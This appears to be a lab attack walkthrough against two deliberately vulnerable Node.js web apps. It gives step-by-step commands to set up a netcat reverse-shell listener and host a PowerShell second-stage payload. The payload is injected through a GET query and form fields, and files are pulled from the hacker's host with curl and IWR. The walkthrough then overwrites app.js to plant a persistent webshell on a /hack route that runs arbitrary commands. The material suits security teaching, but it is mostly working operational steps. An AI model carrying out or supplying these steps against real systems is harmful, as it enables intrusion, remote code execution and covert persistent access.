<h1 align="center">1 Initial Stage</h2>

`(h)` = hacker terminal, `(v)` = netcat reverse shell, `tcs` = The Cutlery Shop, `wity` = What Is The Year.

## 1.1 Start a netcat listener
Before performing the attack, the hacker machine must host a web server. Which will listen for [reverse tcp](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/) connections, the following example uses [openbsd-netcat](https://man.openbsd.org/nc.1).
```
(h) $ nc -lvnp 8000
```

## 1.2 Start a payload server
Since [injector.js](./injector.js) will retrieve a second stage file [payload.ps1](./payload.ps1) from the hacker machine we have to make that file available to the victim.
```
(h) $ cd payload/Windows
(h) $ python -m http.server 5000
```

## 1.3 Customise payload details
Open command prompt and find out the local IPv4 address of your hacker machine.
```
(h) $ ip addr
```
Open [injector.js](./injector.js) and modify it according to the IPv4 address of your hacker machine.
```
# injector.js
... DownloadString("http://<hacker-ip>:5000/payload.ps1") ...
```

## 1.4 Injecting payload into "What Is The Year?" web app
### Method 1 - Copy Paste
Copy the contents of the [injector.js](./injector.js) file.
```
(h) $ xclip -in payload/Windows/injector.js -selection clipboard
```
And paste the contents of [injector.js](injector.js) into the `year` HTTP GET Query
```
(h) $ curl -G --data-urlencode "year=<payload>" http://<victim-ip>:3000
```
### Method 2 - Server/Client
We utilise cURL to inject the payload to the victim web server
```
(h) $ curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/injector.js)" http://<victim-ip>:3000
```

## 1.5 Injecting payload into "The Cutlery Shop" web app
Using the form fields of the application, you can perform a string escape on the `Name` field, and inject the contents of [injector.js](./injector.js) there.

![string-escape](../../images/string-escape.png)

Alternatively, you can simply paste [injector.js](./injector.js) into the `Price` field, since it does not take a string input.

![direct-inject](../../images/direct-inject.png)

## 1.6 Result
If successful, the hacker machine will receive a socket output similar to what is shown below:
```
% nc -lnvp 8000
Listening on 0.0.0.0 8000
Connection received on 127.0.0.1 44598
$ ls
README.md
app.js
node_modules
package-lock.json
package.json
public
views
```

<h1 align="center">2 Persistence Stage</h2>

## 2.2 Webshell Backdoor
The reverse shell provides us the privilege of the compromised user, but it is a temporary foothold in the system. To gain persistence, we can introduce a webshell as a secondary entry into the system.

The [wity-webshell.js](../Webshells/wity-webshell.js) and [tcs-webshell.js](../Webshells/tcs-webshell.js) files contains a snippet of code prepared in advance, which adds a webshell to the NodeJS application. You must use the appropriate webshell file matching the name of the web app you are running.


## 2.3 Creating Webshell File
It is slightly inconvenient to create text files with very specific contents from a primitive reverse shell. Here is one technique that I use to create malicious files on the server.

### File Upload
Host a web server from `payload/Webshells` directory
```
(h) $ cd payload/Webshells
(h) $ php -S 0.0.0.0:5000
```
Then use the reverse shell to download it on the victim's machine.  
```
(v) $ IWR "http://<hacker-ip>:5000/webshell.js" -OutFile .\webshell.js
```

## 2.4 Editing Files In Powershell
The most important file in both web applications is the `app.js` file. Because it contains all the routes to the frontend pages, but in a real scenario, files of interests may vary. 

[AFAIK](https://www.urbandictionary.com/define.php?term=afaik), there are no easy ways to edit text files straight from powershell. Even if you have access to a reverse shell and install editors like [vim](https://www.vim.org/) or [nano](https://www.nano-editor.org/) on the victim machine. Due to the nature of this hack, some terminal text editors will not function properly

Which leaves you with only one easy option, that is to edit the file locally:
### Step 1 - Spawn a new netcat session
kill the current reverse shell and start a new netcat listener in the hacker machine, and capture the output into a file:
```
(h) $ nc -lvnp 8000 | tee output.txt
```
If `tee` is not installed in your system, just redirect the output to a file, and monitor updates with `tail`.
```
# terminal 1
(h) $ nc -lvnp 8000 > output.txt

# terminal 2
(h) $ tail -F output.txt
```

### Step 2 - Read the contents of `app.js`
Repeat the steps to use `injector.js` and spawn a reverse shell
```
(h) $ curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/injector.js)" http://<victim-ip>:3000
```
Read the contents of `app.js` and keep this reverse shell alive
```
(v) $ cat app.js
```

### Step 3 - Upload modified `app.js`
Copy the local file `output.txt` to a local `app.js` and delete unnecessary outputs. Then edit line 39 to include the appropriate [webshell](../Webshells).
```
(h) $ cp output.txt app.js
(h) $ sed -i "39r payload/Webshells/webshell.js" app.js
```
Host a server in the current working directory just like in earlier steps.
```
(h) $ python -m http.server 5000
```
Then upload the maliciously crafted file to the victim web server.
```
(v) $ IWR "http://<hacker-ip>:5000/app.js" -OutFile .\app.js
```
## 2.5 Using The Backdoor

The payload will spawn a webshell which you can access from the `/hack` route in `http://<victim-ip>:3000`. Commands can be executed by appending them in front of the `cmd` HTTP GET Query.

Using the cURL program
```
(h) $ curl -G --data-urlencode "cmd=<command>" http://<victim-ip>:3000/hack
```

Using a web browser
```
http://<victim-ip>:3000/hack?cmd=<command>
```

### Result
![webshell-screenshot](../../images/webshell.png)
